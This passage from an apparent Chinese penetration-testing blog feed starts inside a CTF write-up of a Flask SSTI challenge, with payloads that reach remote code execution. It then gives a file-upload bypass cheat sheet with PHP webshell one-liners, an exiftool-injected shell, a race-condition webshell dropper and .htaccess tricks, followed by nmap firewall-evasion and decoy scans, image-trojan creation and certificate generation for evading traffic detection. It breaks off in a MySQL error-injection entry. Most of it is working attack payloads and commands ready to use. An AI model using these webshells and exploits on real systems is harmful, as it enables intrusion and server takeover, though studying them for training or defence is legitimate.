punctuation">)</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>        verb <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'verb'</span><span class="token punctuation">)</span>        noun <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'noun'</span><span class="token punctuation">)</span>        adjective <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'adjective'</span><span class="token punctuation">)</span>        person <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">)</span>        place <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'place'</span><span class="token punctuation">)</span>        params <span class="token operator">=</span> <span class="token punctuation">[</span>verb<span class="token punctuation">,</span> noun<span class="token punctuation">,</span> adjective<span class="token punctuation">,</span> person<span class="token punctuation">,</span> place<span class="token punctuation">]</span>        <span class="token keyword">if</span> any<span class="token punctuation">(</span>len<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">21</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> params<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'your words must not be longer than 21 characters!'</span><span class="token punctuation">,</span> <span class="token number">403</span>        madlib <span class="token operator">=</span> f<span class="token string">'To find out what this is you must {verb} the internet then get to the {noun} system through the visual MAC hard drive and program the open-source but overriding the bus won\'t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card {adjective}.{person} taught me this trick when we met in {place} allowing you to download the knowledge of what this is directly to your brain.'</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>madlib<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'This madlib only takes five words'</span><span class="token punctuation">,</span> <span class="token number">403</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'/app/'</span><span class="token punctuation">,</span> <span class="token string">'app.py'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">1337</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、填写信息，提交"><a href="#2、填写信息，提交" class="headerlink" title="2、填写信息，提交"></a>2、填写信息，提交</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765708136-d1f00515-db24-4c51-bf63-e12b9c409c26.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u9b4853be&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=252&amp;originWidth=560&amp;originalType=url%E2%88%B6=1&amp;size=28104&amp;status=done&amp;style=none&amp;taskId=u5d07375c-e7fb-4fce-811e-0a35362eaf9" alt="image.png"></p><h3 id="3-抓包"><a href="#3-抓包" class="headerlink" title="3. 抓包"></a>3. 抓包</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765706876-e83eef90-9429-41be-8e5b-937364e18fa7.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u49ee5209&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=509&amp;originWidth=1161&amp;originalType=url%E2%88%B6=1&amp;size=106816&amp;status=done&amp;style=none&amp;taskId=u53fec3a9-6e7a-4e1f-9d22-e2cf19220b1" alt="image.png"></p><h3 id="4-分析源代码"><a href="#4-分析源代码" class="headerlink" title="4. 分析源代码"></a>4. 分析源代码</h3><p>根据源代码可以判断出这是一道 SSTI 题，需要满足以下条件：</p><ul><li>post 提交 json 数据到 <em>/madlib</em></li><li>json 长度等于 5</li><li>json 数据中的 verb、noun、adjective、person、place、params 长度不能超过 21</li></ul><p>​</p><h3 id="5-测试-SSTI"><a href="#5-测试-SSTI" class="headerlink" title="5. 测试 SSTI"></a>5. 测试 SSTI</h3><p>在 verb 处输入 24 输出 <strong>24</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765707358-c77c3510-e9a4-46f3-bc2e-825cae9deadb.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=ud67ae79d&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=426&amp;originWidth=1149&amp;originalType=url%E2%88%B6=1&amp;size=98334&amp;status=done&amp;style=none&amp;taskId=u01cca9d4-8ed4-46e9-9313-281c7ae558a" alt="image.png"></p><h3 id="6-绕过长度判断-RCE"><a href="#6-绕过长度判断-RCE" class="headerlink" title="6. 绕过长度判断 RCE"></a>6. 绕过长度判断 RCE</h3><p>这一步卡了挺久的，后来想到了：既然是 json 格式的数据，那么是否可以嵌套 array 呢？尝试了一下发现果然可以<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765706424-e435911d-b827-48db-bfc0-58ef5d0f2a98.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=ub311da77&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=549&amp;originWidth=1169&amp;originalType=url%E2%88%B6=1&amp;size=116874&amp;status=done&amp;style=none&amp;taskId=u803161cd-518d-494b-a907-b3c77412790" alt="image.png"><br>成功绕过长度限制！<br>​</p><h3 id="7-RCE"><a href="#7-RCE" class="headerlink" title="7. RCE"></a>7. RCE</h3><p>可以把字符串内容写到 get 参数中，使用 request.args.参数名称读取：</p><pre class="line-numbers language-http"><code class="language-http">POST /madlib?e=__import__('os').popen('ls').read(){"verb":["{{().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](request.args.e)}}",2],"noun":"456","adjective":"333","person":"444","place":"555"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765708458-702f201f-7809-4385-b7de-e9709e72aa18.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u48a787ab&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=534&amp;originWidth=1216&amp;originalType=url%E2%88%B6=1&amp;size=127351&amp;status=done&amp;style=none&amp;taskId=u167b6053-e07a-4532-b1f9-879bf2b212b" alt="image.png"></p><h3 id="8-Get-Flag"><a href="#8-Get-Flag" class="headerlink" title="8. Get Flag"></a>8. Get Flag</h3><pre class="line-numbers language-http"><code class="language-http">POST /madlib?e=__import__('os').popen('cat+flag.txt').read(){"verb":["{{().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](request.args.e)}}",2],"noun":"456","adjective":"333","person":"444","place":"555"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1633765708965-e73bebe1-95ee-4943-b728-d101f9290fcf.png#clientId=u832c4857-9c1d-4&amp;from=paste&amp;id=u6b35c03c&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=529&amp;originWidth=1223&amp;originalType=url%E2%88%B6=1&amp;size=128136&amp;status=done&amp;style=none&amp;taskId=u9dec12ed-b0ea-4ace-b290-bd7d23e00e3" alt="image.png"><br>​</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>任意文件上传绕过</title>
      <link href="/post/31538d4f.html"/>
      <url>/post/31538d4f.html</url>
      
        <content type="html"><![CDATA[<h1 id="任意文件上传绕过"><a href="#任意文件上传绕过" class="headerlink" title="任意文件上传绕过"></a>任意文件上传绕过</h1><h2 id="0x01-绕过黑名单"><a href="#0x01-绕过黑名单" class="headerlink" title="0x01 绕过黑名单"></a>0x01 绕过黑名单</h2><p>除了常规扩展名之外，还有其他扩展名可用于绕过黑名单过滤</p><h3 id="1-PHP"><a href="#1-PHP" class="headerlink" title="1. PHP"></a>1. PHP</h3><pre><code>常用扩展名：.pht, .phtml, .php3, .php4, .php5, .php6, .inc大小写敏感：.pHp, .Php, .phP</code></pre><h3 id="2-JSP"><a href="#2-JSP" class="headerlink" title="2. JSP"></a>2. JSP</h3><pre><code>.jspx, .jspf, .jsw, .jsv</code></pre><h2 id="0x02-绕过白名单"><a href="#0x02-绕过白名单" class="headerlink" title="0x02 绕过白名单"></a>0x02 绕过白名单</h2><h3 id="1-jpg"><a href="#1-jpg" class="headerlink" title="1. .jpg"></a>1. .jpg</h3><pre><code>shell.php.jpg</code></pre><h3 id="2-截断"><a href="#2-截断" class="headerlink" title="2. 截断"></a>2. 截断</h3><pre><code>shell.php%00.jpg或shell.php\x00.jpg</code></pre><h3 id="3-文件头类型检测"><a href="#3-文件头类型检测" class="headerlink" title="3. 文件头类型检测"></a>3. 文件头类型检测</h3><pre class="line-numbers language-php"><code class="language-php">GIF89a<span class="token punctuation">;</span> <span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x03-Exif-数据"><a href="#0x03-Exif-数据" class="headerlink" title="0x03 Exif 数据"></a>0x03 Exif 数据</h2><p>绕过文件上传限制的下一种方法是使用图片中的 Exif 数据，可以插入包含有效 PHP 代码的注释，该注释将在处理图像时由服务器执行。<br>注：该技术可以与绕过黑名单或白名单的方法结合使用</p><h3 id="1-可以使用-exiftool-来执行此操作-如果尚未安装，请使用-apt-进行安装："><a href="#1-可以使用-exiftool-来执行此操作-如果尚未安装，请使用-apt-进行安装：" class="headerlink" title="1. 可以使用 exiftool 来执行此操作-如果尚未安装，请使用 apt 进行安装："></a>1. 可以使用 exiftool 来执行此操作-如果尚未安装，请使用 apt 进行安装：</h3><pre class="line-numbers language-bash"><code class="language-bash">~<span class="token comment" spellcheck="true"># apt install exiftool</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-然后，我们可以在图片中插入一个简单的-Shell-命令作为注释："><a href="#2-然后，我们可以在图片中插入一个简单的-Shell-命令作为注释：" class="headerlink" title="2. 然后，我们可以在图片中插入一个简单的 Shell 命令作为注释："></a>2. 然后，我们可以在图片中插入一个简单的 Shell 命令作为注释：</h3><pre class="line-numbers language-bash"><code class="language-bash">~<span class="token comment" spellcheck="true"># exiftool -Comment="&lt;?php system($_GET['cmd']); ?>" pic.jpg</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-使用file命令，可以看到代码已成功插入"><a href="#3-使用file命令，可以看到代码已成功插入" class="headerlink" title="3. 使用file命令，可以看到代码已成功插入"></a>3. 使用<strong>file</strong>命令，可以看到代码已成功插入</h3><pre class="line-numbers language-bash"><code class="language-bash">~<span class="token comment" spellcheck="true"># file pic.jpg</span>pic.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: <span class="token string">"&lt;?php system(['cmd']); ?>"</span>, baseline, precision 8, 1920x840, components 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-修改为-PHP-文件"><a href="#4-修改为-PHP-文件" class="headerlink" title="4. 修改为 PHP 文件"></a>4. 修改为 PHP 文件</h3><pre class="line-numbers language-bash"><code class="language-bash">~<span class="token comment" spellcheck="true"># mv pic.jpg pic.php.jpg</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h2 id="0x04-文件内容绕过"><a href="#0x04-文件内容绕过" class="headerlink" title="0x04 文件内容绕过"></a>0x04 文件内容绕过</h2><h3 id="1-常用-payload"><a href="#1-常用-payload" class="headerlink" title="1. 常用 payload"></a>1. 常用 payload</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span>`<span class="token variable">$_GET</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span>`<span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x05-利用-NTFS-ADS-特性"><a href="#0x05-利用-NTFS-ADS-特性" class="headerlink" title="0x05 利用 NTFS ADS 特性"></a>0x05 利用 NTFS ADS 特性</h2><p>ADS 是 NTFS 磁盘格式的一个特性，用于 NTFS 交换数据流。<br>在 php+windows 的情况下：如果<code>文件名+::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名，且保持<code>::$DATA</code>之前的文件名。<br>例如：<code>1.php::$DATA</code></p><table><thead><tr><th><strong>上传文件名</strong></th><th><strong>生成文件</strong></th><th><strong>生成的文件内容</strong></th></tr></thead><tbody><tr><td>Truda.php:a.jpg</td><td>Truda.php</td><td>空</td></tr><tr><td>Truda.php::$DATA</td><td>truda.php</td><td><!--?php phpinfo(); ?--></td></tr><tr><td>Truda.php::$INDEX_ALLOCATION</td><td>truda.php</td><td>空</td></tr><tr><td>truda.php::$DATA.jpg</td><td>0.jpg</td><td><!--?php phpinfo(); ?--></td></tr><tr><td>truda.php::$DATA\eee.jpg</td><td>eee.jpg</td><td><!--?php phpinfo(); ?--></td></tr></tbody></table><p>这里，我们上传一个名为 xxx.php::$DATA 的木马，然后，在浏览器中访问 xxx.php。<br>​</p><h2 id="0x06-分块传输-waf"><a href="#0x06-分块传输-waf" class="headerlink" title="0x06 分块传输 waf"></a>0x06 分块传输 waf</h2><p>利用 Burpsuit 分块传输插件 <a href="https://github.com/c0ny1/chunked-coding-converter">chunked-coding-converter</a> 绕过 WAF 检测。<br>例如：宝塔 WAF<br>​</p><h2 id="0x07-条件竞争绕过"><a href="#0x07-条件竞争绕过" class="headerlink" title="0x07 条件竞争绕过"></a>0x07 条件竞争绕过</h2><h3 id="网站处理逻辑"><a href="#网站处理逻辑" class="headerlink" title="网站处理逻辑"></a>网站处理逻辑</h3><ul><li>网站允许上传任意文件，然后检查上传文件是否包含 webshell，如果包含删除该文件。</li><li>网站允许上传任意文件，但是如果不是指定类型，那么使用 unlink 删除文件。</li></ul><p>​</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>在网站删除上传的 php 文件之前访问该文件，从而执行上传文件中的 php 代码。<br>例如：上传文件代码如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST["cmd"])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先进行文件上传，后进行判断与删除，利用时间差进行 webshell 上传。<br>技巧：使用 burpsuite 循环访问上传的文件，然后循环进行上传。<br>​</p><h2 id="0x08-文件名双写绕过"><a href="#0x08-文件名双写绕过" class="headerlink" title="0x08 文件名双写绕过"></a>0x08 文件名双写绕过</h2><p>例如这样的限制代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接使用双写绕过就行 x.pphphp ，最后生成 x.php 文件。<br>​</p><h2 id="0x09-配合文件解析漏洞绕过"><a href="#0x09-配合文件解析漏洞绕过" class="headerlink" title="0x09 配合文件解析漏洞绕过"></a>0x09 配合文件解析漏洞绕过</h2><h3 id="1-IIS-5-x-6-0-解析漏洞"><a href="#1-IIS-5-x-6-0-解析漏洞" class="headerlink" title="1. IIS 5.x/6.0 解析漏洞"></a>1. IIS 5.x/6.0 解析漏洞</h3><p>目录解析：<code>/xxx.asp/xxx.jpg</code><br>文件解析：<code>xxx.asp;.jpg</code></p><h3 id="2-IIS-7-0-IIS-7-5-Nginx-lt-8-03-畸形解析漏洞"><a href="#2-IIS-7-0-IIS-7-5-Nginx-lt-8-03-畸形解析漏洞" class="headerlink" title="2. IIS 7.0/IIS 7.5/ Nginx <8.03 畸形解析漏洞"></a>2. IIS 7.0/IIS 7.5/ Nginx &lt;8.03 畸形解析漏洞</h3><p>漏洞成因：nginx 默认以 cgi 的方式支持 php 的运行，譬如在配置文件当中 fastcgi 方式下 cgi.fix_pathinfo 是开启的。<br>涉及版本：<strong>php5.2.12</strong>、<strong>php5.3.1(Default)</strong><br>在默认 Fast-CGI 开启状况下，上传一个名字为 <strong>xxx.jpg</strong>，内容为</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?PHP</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php eval($_POST[cmd])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问<strong>xxx.jpg/.php</strong>，在这个目录下就会生成一句话木马<strong>shell.php</strong></p><h3 id="3-Nginx-lt-8-03-空字节代码执行漏洞"><a href="#3-Nginx-lt-8-03-空字节代码执行漏洞" class="headerlink" title="3. Nginx <8.03 空字节代码执行漏洞"></a>3. Nginx &lt;8.03 空字节代码执行漏洞</h3><p>影响版本：0.5.<em>, 0.6.</em>, 0.7&lt;=0.7.65, 0.8&lt;=0.8.37<br>Nginx 在图片中嵌入 PHP 代码，然后通过访问<code>/xxx.jpg%00.php</code> 来执行其中的代码.<br>​</p><h3 id="4-Apache-解析漏洞"><a href="#4-Apache-解析漏洞" class="headerlink" title="4. Apache 解析漏洞"></a>4. Apache 解析漏洞</h3><p>Apache 是从右到左开始判断解析，如果为不可识别解析，就再往左判断.<br>比如 _xxx.php.owf.rar_，“.owf”和”.rar”这两种后缀是 apache 不可识别解析，apache 就会把 xxx.php.owf.rar 解析成 php。<br>​</p><p>如何判断是不是合法的后缀就是这个漏洞的利用关键，测试时可以尝试上传一个 xxx.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀.<br>​</p><h2 id="0x10-上传-htaccess-文件"><a href="#0x10-上传-htaccess-文件" class="headerlink" title="0x10 上传.htaccess 文件"></a>0x10 上传.htaccess 文件</h2><p><strong>.htaccess</strong>文件介绍：.htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的<strong>网页配置</strong>。<br>可以尝试上传 <strong>.htaccess</strong> 文件：</p><pre class="line-numbers language-html"><code class="language-html">// 表示把jpg当作php执行 AddType application/x-httpd-php .jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考资料</p><blockquote><p><a href="http://www.kxsy.work/2021/07/13/wen-jian-shang-chuan-lou-dong/">《浅谈文件上传漏洞》</a> &gt; <a href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">《文件上传漏洞总结》</a> &gt; <a href="https://www.yuque.com/feiniao112/hnk3pi/gtn7a2#n8EL2">《文件上传及 Fuzz》</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap绕过防火墙扫描</title>
      <link href="/post/ced5a0fe.html"/>
      <url>/post/ced5a0fe.html</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap-绕过防火墙扫描"><a href="#Nmap-绕过防火墙扫描" class="headerlink" title="Nmap 绕过防火墙扫描"></a>Nmap 绕过防火墙扫描</h1><h2 id="一、使用-Nmap-脚本进行防火墙检测"><a href="#一、使用-Nmap-脚本进行防火墙检测" class="headerlink" title="一、使用 Nmap 脚本进行防火墙检测"></a>一、使用 Nmap 脚本进行防火墙检测</h2><pre class="line-numbers language-bash"><code class="language-bash">nmap --script<span class="token operator">=</span>firewalk --traceroute www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap --traceroute --script firewalk --script-args firewalk.recv-timeout<span class="token operator">=</span>60000,firewalk.max-active-probes<span class="token operator">=</span>3,firewalk.max-retries<span class="token operator">=</span>3,firewalk.probe-timeout<span class="token operator">=</span>600 www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 80 --script http-waf-detect www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 80 --script http-waf-detect --script-args<span class="token operator">=</span><span class="token string">"http-waf-detect.detectBodyChanges"</span> www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="二、Nmap-突破防火墙扫描"><a href="#二、Nmap-突破防火墙扫描" class="headerlink" title="二、Nmap 突破防火墙扫描"></a>二、Nmap 突破防火墙扫描</h2><h3 id="1-碎片扫描"><a href="#1-碎片扫描" class="headerlink" title="1. 碎片扫描"></a>1. 碎片扫描</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap -f www.example.comnmap -mtu 8 www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-诱饵扫描"><a href="#2-诱饵扫描" class="headerlink" title="2. 诱饵扫描"></a>2. 诱饵扫描</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap -D RND:10 www.example.comnmap –D decoy1,decoy2,decoy3 www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-空闲扫描"><a href="#3-空闲扫描" class="headerlink" title="3. 空闲扫描"></a>3. 空闲扫描</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap -P0 -sI zombie www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-随机数据长度"><a href="#4-随机数据长度" class="headerlink" title="4. 随机数据长度"></a>4. 随机数据长度</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap --data-length 25 www.example.comnmap --randomize-hosts www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-欺骗扫描"><a href="#5-欺骗扫描" class="headerlink" title="5. 欺骗扫描"></a>5. 欺骗扫描</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap --sT -PN --spoof-mac aa:bb:cc:dd:ee:ff www.example.comnmap --badsum www.example.comnmap -g 80 -S www.baidu.com www.example.comnmap -p80 --script http-methods --script-args http.useragent<span class="token operator">=</span><span class="token string">"Mozilla 5"</span> www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 防火墙 </tag>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图马制作</title>
      <link href="/post/9b491ac2.html"/>
      <url>/post/9b491ac2.html</url>
      
        <content type="html"><![CDATA[<h1 id="图马制作"><a href="#图马制作" class="headerlink" title="图马制作"></a>图马制作</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>图马又称为图片马，可以把<strong>恶意代码</strong>隐藏到图片中，而不影响图片的正常显示，通常用于<strong>任意文件上传漏洞</strong>中绕过限制。</p><h2 id="二、制作方法"><a href="#二、制作方法" class="headerlink" title="二、制作方法"></a>二、制作方法</h2><h2 id="首先准备两个文件"><a href="#首先准备两个文件" class="headerlink" title="首先准备两个文件"></a>首先准备两个文件</h2><ul><li>image.png 是一张正常的图片</li><li>pass.php 是可执行程序代码文件</li></ul><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> image.png pass.php <span class="token operator">></span> mumu.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Windowns"><a href="#Windowns" class="headerlink" title="Windowns"></a>Windowns</h2><pre class="line-numbers language-bash"><code class="language-bash">copy image.png/b + pass.php muma.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成的 muma.png 就是图片马。<br>​</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用SSL/TLS对抗流量检测</title>
      <link href="/post/9015fd24.html"/>
      <url>/post/9015fd24.html</url>
      
        <content type="html"><![CDATA[<h1 id="使用-SSL-TLS-对抗流量检测"><a href="#使用-SSL-TLS-对抗流量检测" class="headerlink" title="使用 SSL/TLS 对抗流量检测"></a>使用 SSL/TLS 对抗流量检测</h1><h2 id="一、证书生成（openssl-生成自定义证书）"><a href="#一、证书生成（openssl-生成自定义证书）" class="headerlink" title="一、证书生成（openssl 生成自定义证书）"></a>一、证书生成（openssl 生成自定义证书）</h2><p>使用 SSL/TLS 认证，第一步就是生成一个 SSL 证书。</p><ol><li>模板 1</li></ol><pre class="line-numbers language-bash"><code class="language-bash">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \-subj <span class="token string">"/C=UK/ST=London/L=London/O=Development/CN=www.google.com"</span> \-keyout www.google.com.key \-out www.google.com.crt <span class="token operator">&amp;&amp;</span> \<span class="token function">cat</span> www.google.com.key www.google.com.crt <span class="token operator">></span> www.google.com.pem <span class="token operator">&amp;&amp;</span> \<span class="token function">rm</span> -f www.google.com.key www.google.com.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>模板 2</li></ol><pre class="line-numbers language-bash"><code class="language-bash">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \-subj <span class="token string">"/C=US/ST=Texas/L=Austin/O=Development/CN=118.25.69.199"</span> \-keyout hack.key \-out hack.crt <span class="token operator">&amp;&amp;</span> \<span class="token function">cat</span> hack.key  hack.crt <span class="token operator">></span> hack.pem <span class="token operator">&amp;&amp;</span> \<span class="token function">rm</span> -f hack.key  hack.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量检测 </tag>
            
            <tag> SSL/TLS​ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL xpath 报错注入</title>
      <link href="/post/5fd295ac.html"/>
      <url>/post/5fd295ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL-xpath-报错注入"><a href="#MySQL-xpath-报错注入" class="headerlink" title="MySQL xpath 报错注入"></a>MySQL xpath 报错注入</h1><h2 id="一、关于-updatexml-函数和-extractvalue-函数"><a href="#一、关于-updatexml-函数和-extractvalue-函数" class="headerlink" title="一、关于 updatexml 函数和 extractvalue 函数"></a>一、关于 updatexml 函数和 extractvalue 函数</h2><p>格式：</p><pre class="line-numbers language-xml"><code class="language-xml">UPDATEXML(XML_document, XPath_string, new_value);extractvalue(XML_document, XPath_string, new_value);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc。</li><li>第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。</li><li>第三个参数：new_value，String 格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值。</li></ul><pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token 